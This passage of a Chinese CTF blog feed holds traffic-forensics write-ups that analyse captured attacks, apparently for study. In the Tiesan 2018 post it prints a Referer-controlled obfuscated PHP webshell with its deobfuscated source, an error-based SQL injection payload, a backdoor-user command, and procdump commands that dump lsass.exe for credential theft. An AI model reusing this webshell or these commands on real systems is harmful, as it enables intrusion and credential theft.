src="https://s1.ax1x.com/2018/09/06/iCer6S.md.png" alt="iCer6S.md.png"></a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实这个题目还有其他骚操作，比如用利用<code>wget</code>，以及直接构造一个比较骚气的域名。。这域名搞不来，我就没有尝试了，至于wget方法的话下次复现一下2015年的babyfirst在尝试一下<br>小结一波，这个题目收获很大，先来讲这个东西其实是关乎对Linux系统各种缩小版米昂领的熟悉程度，比如怎样能快速新建文件这里就用了&gt;这个符号去创建，还有通过管道符去执行bash命令(这一点就可以继续去推行还可以使用python，php一系列的命令结合各种语言反弹webshell的操作)，这都是我想不到的东西，归根到底是学的东西还是不能够灵活使用<br>顺便吐槽一下，最近的算法课懵逼得很，全都跟高数的级数收敛还有泰勒展开扯上关系，突然恐惧，还得重新用C++写oj上的算法题目，都是些大佬。。我做完的时候他们都不知道ak多久了。。。<br><a href="https://imgchr.com/i/iCeb79" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeb79.md.png" alt="iCeb79.md.png"></a></p><p>恐怕9月份难熬23333.。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="0verwatch.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>铁三2018.5.5数据分析</title>
    <link href="0verwatch.top/2018/09/06/liuliangfenxi-5-5/"/>
    <id>0verwatch.top/2018/09/06/liuliangfenxi-5-5/</id>
    <published>2018-09-06T09:30:21.000Z</published>
    <updated>2018-09-06T09:53:58.882Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>keep learning</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>链接: <a href="https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ</a> 密码: nux4<br>感谢方方土学长的<a href="http://skysec.top/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" target="_blank" rel="noopener">题解</a>，学习到<a id="more"></a>了一定的套路</p><p>题目描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.黑客攻击的第一个受害主机的网卡IP地址</span><br><span class="line">2.黑客对URL的哪一个参数实施了SQL注入</span><br><span class="line">3.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)</span><br><span class="line">4.第一个受害主机网站数据库的名字</span><br><span class="line">5.Joomla后台管理员的密码是多少</span><br><span class="line">6.黑客第一次获得的php木马的密码是什么</span><br><span class="line">7.黑客第二次上传php木马是什么时间</span><br><span class="line">8.第二次上传的木马通过HTTP协议中的哪个头传递数据</span><br><span class="line">9.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)</span><br><span class="line">10.php代理第一次被使用时最先连接了哪个IP地址</span><br><span class="line">11.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候</span><br><span class="line">12.黑客在内网主机中添加的用户名和密码是多少</span><br><span class="line">13.黑客从内网服务器中下载下来的文件名</span><br></pre></td></tr></table></figure><p>先看看这些包都是按时间顺序命名的<br><img src="https://s1.ax1x.com/2018/09/06/iCAIZn.png" alt="iCAIZn.png"><br>先打开第一个包<br>一般黑客攻击先从应用层发起攻击，所以先过滤<code>http</code>看一下<br>发现ip为<code>202.1.1.2</code>对<code>192.168.1.8</code>有很明显的爆破痕迹，把里面的url的内容urldecode一下会发现明显的sql查询语句，而且有很明显sqlmap指纹痕迹<br><img src="https://s1.ax1x.com/2018/09/06/iCAbGT.png" alt="iCAbGT.png"></p><p>所以就解决了受害主机ip是<code>192.168.1.8</code><br>我们再详细过滤一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and ip.src == 202.1.1.2</span><br></pre></td></tr></table></figure><p>可以得到比较详细的爆破过程，标记一下最后一个，然后返回http查看他的response<br><a href="https://imgchr.com/i/iCAqRU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCAqRU.md.png" alt="iCAqRU.md.png"></a></p><p>很明显了，注入的参数是<code>list[select]</code>,并且应该是使用了<code>报错注入</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span>\n</span><br><span class="line">   <span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> <span class="attr">xml:lang</span>=<span class="string">"en-gb"</span> <span class="attr">lang</span>=<span class="string">"en-gb"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span>\n</span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span>\n</span><br><span class="line">   \t<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span>\n</span><br><span class="line">    [truncated]\t<span class="tag">&lt;<span class="name">title</span>&gt;</span>Error: 500 XPATH syntax error: &amp;#039;qqzvqadminqqkkq&amp;#039; SQL=SELECT (UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71</span><br><span class="line">   FROM `ajtuc_ucm_history` AS h\n</span><br><span class="line">   LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id\n</span><br></pre></td></tr></table></figure><p>而且还可以从响应里面发现是从<code>joomla.ajtuc_users</code>表里面注入的东西，也知道了前缀为<code>ajtuc</code>，同时也知道了数据库为<code>joomla</code>。第三四题解决</p><p>然后要找登录后台的密码，但是这里直接<code>contains &quot;password&quot;</code>是找不到的，我们这时候就得转换思路就是说黑客是从数据库里把密码爆出来的<br>如果仔细看这个黑客的行为的话，他事先尝试登录发现不行才用的SQL注入，所以也就跟着这个思路来走了</p><p>既然报错注入，里面必含有password的关键字以及表名，立即过滤<br><code>ip.src == 202.1.1.2 and http contains &quot;password&quot; and http contains &quot;joomla.ajtuc_users&quot;</code><br>发现有三条，标记一下查看他们的response<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Status: 500 XPATH syntax error: &apos;qqzvq$2y$10$lXujU7XaUviJDigqqkkq&apos; </span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq&apos; </span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqzi/8B2QRD7qIlDJeqqkkq&apos;</span><br></pre></td></tr></table></figure></p><p>再来查看一下报错注入是这样的，存在拼接<code>0x71717a7671</code>，解码一下<code>qqzvq</code><br><code>UPDATEXML(5928,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,22</code>，所以得把qqzvq前缀去掉</p><p><code>$2y$10$lXujU7XaUviJDigqqkkqFMzKy6.wx7EMCBqpzrJdn7qqkkqzi/8B2QRD7qIlDJeqqkkq</code><br>拼接起来就是经过加密后的密码，官方答案是qwert123，但还是解不出来</p><p>第一个包里面过滤<br><code>http.request.method == &quot;POST&quot; and ip.src == 202.1.1.2</code><br><a href="https://imgchr.com/i/iCEeeA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEeeA.md.png" alt="iCEeeA.md.png"></a></p><p>没发现有可疑数据</p><p>再找第二个包<br><code>ip.src == 202.1.1.2 and http.request.method == &quot;POST&quot; and http contains &quot;eval&quot;</code>，发现存在一个文件<code>kkkaaa.php</code><br><a href="https://imgchr.com/i/iCEMJf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEMJf.md.png" alt="iCEMJf.md.png"></a></p><p>可以发现这里面的是一个马，密码为<code>zzz</code><br>然后我们再根据这个马去寻找上传的的第二个马<br>当我们点到第三个报文的时候发现多了一个参数<code>z2</code>，有点可疑<br><a href="https://imgchr.com/i/iCEQW8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEQW8.md.png" alt="iCEQW8.md.png"></a></p><p>保存出来看一下，发现是段php代码，<br><img src="https://s1.ax1x.com/2018/09/06/iCE3Qg.png" alt="iCE3Qg.png"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>.$p=<span class="string">'l&gt;]ower";$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5'</span>;.$d=<span class="string">']q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll("/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/",&gt;'</span>;.$W=<span class="string">'),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base'</span>;.$e=<span class="string">']T_LANGUAGE"];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u["&gt;]query"],$&gt;]q);$&gt;'</span>;.$E=<span class="string">'&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt("&lt;$k&gt;$d&lt;&gt;]/$k&gt;"&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;'</span>;.$t=<span class="string">'($i.&gt;]$kf),0,3&gt;]));$p&gt;]="";fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;'</span>;.$M=<span class="string">']$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s="substr";$sl="s&gt;]&gt;]trto'</span>;.$P=<span class="string">']f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]="";$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;'</span>;.$j=str_replace(<span class="string">'fr'</span>,<span class="string">''</span>,<span class="string">'cfrrfreatfrfre_funcfrtfrion'</span>);.$k=<span class="string">'];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]"HTTP&gt;]_REFERE&gt;]R"];$ra&gt;]=@&gt;]$r["&gt;]HTTP_A&gt;]CC&gt;]EP&gt;'</span>;.$g=<span class="string">'"";for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;'</span>;.$R=<span class="string">'$k&gt;]h="cb4&gt;]2";$kf="e130"&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o='</span>;.$Q=<span class="string">']s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;'</span>;.$v=<span class="string">']mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array("/_/","/-/"),arr&gt;]ay(&gt;]"/","+"&gt;]'</span>;.$x=str_replace(<span class="string">'&gt;]'</span>,<span class="string">''</span>,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);.$N=$j(<span class="string">''</span>,$x);$N();.<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>解混淆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump($j);</span><br><span class="line">var_dump($x);</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">15</span>) <span class="string">"create_function"</span></span><br><span class="line">string(<span class="number">929</span>) <span class="string">"$kh="</span>cb42<span class="string">";$kf="</span>e130<span class="string">";function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o="</span><span class="string">";for($i=0;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;$r=$_SERVER;$rr=@$r["</span>HTTP_REFERER<span class="string">"];$ra=@$r["</span>HTTP_ACCEPT_LANGUAGE<span class="string">"];if($rr&amp;&amp;$ra)&#123;$u=parse_url($rr);parse_str($u["</span>query<span class="string">"],$q);$q=array_values($q);preg_match_all("</span>/([\w])[\w-]+(?:;q=<span class="number">0.</span>([\d]))?,?/<span class="string">",$ra,$m);if($q&amp;&amp;$m)&#123;@session_start();$s=&amp;$_SESSION;$ss="</span>substr<span class="string">";$sl="</span>strtolower<span class="string">";$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p="</span><span class="string">";for($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0)&#123;$s[$i]="</span><span class="string">";$p=$ss($p,3);&#125;if(array_key_exists($i,$s))&#123;$s[$i].=$p;$e=strpos($s[$i],$f);if($e)&#123;$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("</span>/_/<span class="string">","</span>/-/<span class="string">"),array("</span>/<span class="string">","</span>+<span class="string">"),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print("</span>&lt;$k&gt;$d&lt;/$k&gt;<span class="string">");@session_destroy();&#125;&#125;&#125;&#125;"</span></span><br></pre></td></tr></table></figure></p><p>基本上可以确定这是第二个马<br>上传时间为<br><code>17:20:44.248365</code><br>然后重新过滤一下<br><code>ip.src == 202.1.1.2 and http</code>根据时间上的关系也可以确定第二上传的马的名字为<code>/tmp/footer.php</code></p><p>其实我们也可以从上面发现关于头的操作有两个东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rr = @$_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$_SERVER[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br></pre></td></tr></table></figure></p><p>看的跟清楚一点可以追踪几个<code>footer</code>的流看一下<br>明显发现<code>referer</code>有base64加密但是LANGUAGE没啥变化，所以最后的答案应该是referer<br><a href="https://imgchr.com/i/iCENoq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCENoq.md.png" alt="iCENoq.md.png"></a></p><p>然后题目抛出mysql的操作<br>在第四个包里面才找到关于SQL的相关协议<br><a href="https://imgchr.com/i/iCEbTI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEbTI.md.png" alt="iCEbTI.md.png"></a><br><code>mysql and mysql contains &quot;password&quot;</code><br>过滤之后可以发现黑客又在爆破<br>直接找到最后的login请求里面的hash值就是<code>password</code><br><a href="https://imgchr.com/i/iCEdYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEdYV.md.png" alt="iCEdYV.md.png"></a></p><p>然后再来过滤一波查看黑客究竟<code>footer.php</code>之后的操作，发现有<code>tunnel</code>这样的关键字样，明显第一次使用的代理ip为<code>4.2.2.2</code><br><a href="https://imgchr.com/i/iCEBSU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEBSU.md.png" alt="iCEBSU.md.png"></a></p><p>然后第五到第八个包没有任何有关题目的答案</p><p>过滤第九个包的内容<br><code>(ip.addr == 202.1.1.2) and (http contains &quot;ls&quot;|| http contains &quot;dir&quot;)</code><br>发现有两次列目录的过程<br><a href="https://imgchr.com/i/iCEXff" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEXff.md.png" alt="iCEXff.md.png"></a></p><p>用了<code>dir</code>的那一次才有回显，系统是<code>Windows</code>没错了<br><a href="https://imgchr.com/i/iCEz6g" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEz6g.md.png" alt="iCEz6g.md.png"></a><br>时间很明显就是这个了<br>我么现在知道黑客攻击的ip是<code>192.168.2.20</code>，然后过滤一下<code>ip.addr == 192.168.2.20 &amp;&amp; http</code><br><a href="https://imgchr.com/i/iCVSXQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVSXQ.md.png" alt="iCVSXQ.md.png"></a><br>发现黑客通过echo命令写入一句话木马，然后通过<code>sh.php</code>执行<br>再过滤一下<br><code>ip.src == 192.168.2.20 &amp;&amp; http</code><br>发现在<code>18:49:27.767754</code>发现了疑似黑客振兴<code>net user localgroup</code> 命令的结果<br><a href="https://imgchr.com/i/iCVC0s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVC0s.md.png" alt="iCVC0s.md.png"></a><br>标记一下在其附近找请求</p><p>果不其然<br>在他的下方的post请求里面的<code>z2</code>参数里面解码得到<br><a href="https://imgchr.com/i/iCVFkq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVFkq.md.png" alt="iCVFkq.md.png"></a></p><p><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]</code><br>也就是增加了<code>kaka:kaka</code>这个用户名和密码</p><p>最后一个问题是下载了什么文件，由于使用菜刀下载的，很简单直接过滤post请求就好<br><code>ip.dst == 192.168.2.20 &amp;&amp; http.request.method== &quot;POST&quot;</code><br><a href="https://imgchr.com/i/iCVecF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVecF.md.png" alt="iCVecF.md.png"></a></p><p>在这个包里面会发现最后有几个报文是含有z2参数的，十分可疑，解码<br>会发现哟一个利用<code>procdump.exe</code>操作的东西<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lspasss.dmp&amp;echo [S]&amp;cd&amp;echo [E]</code><br>下面的post请求解码z2参数也是类似的东西<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lsass.exe&amp;echo [S]&amp;cd&amp;echo [E]</code><br>再来解码一下最后一个报文里面的东西，发现这个文件<br><code>C:\phpStudy\WWW\b2evolution\install\test\lsass.exe_180208_185247.dmp</code><br>猜测应该是下了这个文件<br>然后打开第10个报文确认就是这个文件就好了</p><p>答案归纳</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.192.168.1.8</span><br><span class="line">2.list[select]</span><br><span class="line">3.ajtuc</span><br><span class="line">4.joomla</span><br><span class="line">5.$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi/8B2QRD7qIlDJe(未解密)</span><br><span class="line">6.zzz</span><br><span class="line">7.17:20:44.248365</span><br><span class="line">8.Referer</span><br><span class="line">9.admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4</span><br><span class="line">10.4.2.2.2</span><br><span class="line">11.18:49:27.767754</span><br><span class="line">12.kaka:kaka</span><br><span class="line">13.lsass.exe_180208_185247.dmp</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.发现有菜刀流量的时候多关注是否出现z2参数的值，凡是出现这种参数的值得多去解码看看，不要嫌麻烦，因为这里面往往包含一些关键操作<br>2.出现一些有关php混淆的代码的时候要学会找到对应的参数去反混淆2333</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;keep learning&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;链接: &lt;a href=&quot;https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ&lt;/a&gt; 密码: nux4&lt;br&gt;感谢方方土学长的&lt;a href=&quot;http://skysec.top/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题解&lt;/a&gt;，学习到
    
    </summary>
    
      <category term="流量分析" scheme="0verwatch.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
      <category term="流量分析" scheme="0verwatch.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>安恒8月应急响应题目回顾</title>
    <link href="0verwatch.top/2018/08/30/anheng-8month-part1/"/>
    <id>0verwatch.top/2018/08/30/anheng-8month-part1/</id>
    <published>2018-08-30T14:22:35.000Z</published>
    <updated>2018-08-30T14:25:46.544Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最做流量分析的题目感觉还是不太熟悉，所以最近几篇博客都应该都是练习流量分析的题目了，就从安恒8月赛这个应急响应讲起吧，记录一下加深印象，顺便小结一下自己的做题领悟。<a id="more"></a></p><p>题目地址  <a href="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg" target="_blank" rel="noopener">https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、给出黑客使用的扫描器</span><br><span class="line">2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php</span><br><span class="line">3、得到黑客使用了什么账号密码登陆了web后台(形式:username/password)</span><br><span class="line">4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码</span><br><span class="line">5、黑客在robots.txt中找到的flag是什么</span><br><span class="line">6、黑客找到的数据库密码是多少</span><br><span class="line">7、黑客在数据库中找到的hash_code是什么</span><br><span class="line">8、黑客破解了账号ijnu@test.com得到的密码是什么</span><br><span class="line">9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</span><br><span class="line">10、黑客使用了什么账号登陆了mail系统（形式: username/password）</span><br><span class="line">11、黑客获得的vpn,ip是多少</span><br></pre></td></tr></table></figure><p>还得了解一下一些前置的知识</p><p>过滤IP，如源IP或者目标 x.x.x.x<br><code>ip.src == x.x.x.x or ip.dst eq x.x.x.x 或者 ip.addr == x.x.x.x</code><br>过滤端口<br><code>tcp.port eq 80 or udp.port eq 80</code><br>过滤MAC<br><code>eth.dst ==A0:00:00:04:C5:84</code></p><p>http模式过滤(就是一种模糊匹配)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http.request.method== &quot;GET&quot; </span><br><span class="line">http.request.method== &quot;POST&quot; </span><br><span class="line">http.request.uri ==&quot;/img/logo-edu.gif&quot; </span><br><span class="line">http contains&quot;GET&quot; </span><br><span class="line">http contains&quot;HTTP/1.&quot; </span><br><span class="line">http.request.method== &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot;</span><br></pre></td></tr></table></figure><p>一些常见的自动化工具的指纹</p><p>Awvs（Acunetix Web Vulnerability Scanner ）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">acunetix_wvs_security_test acunetix </span><br><span class="line">acunetix_wvs acunetix_test</span><br><span class="line">Acunetix-Aspect-Password: Cookie: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-Host: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-For: </span><br><span class="line">acunetix_wvs_security_test Host: </span><br><span class="line">acunetix_wvs_security_test</span><br></pre></td></tr></table></figure><p>感觉我们只需要http contains “wvs” 或者是 http contains “acunetix”就可以把包给筛选出来</p><p>Netsparker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Scanner: NetsparkerLocation: </span><br><span class="line">NetsparkerAccept: netsparker/checkCookie: </span><br><span class="line">netsparkerCookie: NETSPARKER</span><br></pre></td></tr></table></figure><p>Appscan</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Headers Content-Type: Appscan </span><br><span class="line">Content-Type: AppScanHeaderAccept: Appscan User-Agent:Appscan</span><br></pre></td></tr></table></figure><p>Nessus</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x_forwarded_for: nessus</span><br><span class="line">referer: nessus</span><br><span class="line">host: nessus</span><br></pre></td></tr></table></figure><p>Sqlmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: sqlmap1.2.8#stable</span><br></pre></td></tr></table></figure><h4 id="1、给出黑客使用的扫描器"><a href="#1、给出黑客使用的扫描器" class="headerlink" title="1、给出黑客使用的扫描器"></a>1、给出黑客使用的扫描器</h4><p>竟然是黑客攻击，就应该把把http过滤看一下或者直接搜就行<br><a href="https://imgchr.com/i/Pj0s39" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0s39.md.png" alt="Pj0s39.md.png"></a><br>所以这一题的答案是awvs</p><h4 id="2、得到黑客扫描到的登陆后台是-相对路径即可-admin-login-php"><a href="#2、得到黑客扫描到的登陆后台是-相对路径即可-admin-login-php" class="headerlink" title="2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php"></a>2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php</h4><p>通常后台的名字包括</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">manager</span><br><span class="line">login</span><br><span class="line">system</span><br></pre></td></tr></table></figure><p>所以我们直接搜其中的一个输入命令<code>http contains &quot;login&quot; &amp;&amp; http.request.method == &quot;POST&quot;</code><br><a href="https://imgchr.com/i/Pj0ycR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0ycR.md.png" alt="Pj0ycR.md.png"></a><br>前面的都是登陆的页面，那个password_reset应该是密码重置<br>所以这一题的答案应该是<code>/admin/login.php?rec=login</code></p><p>###3、得到黑客使用了什么账号密码登陆了web后台(形式:username/password)<br>也是同样的套路<br>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 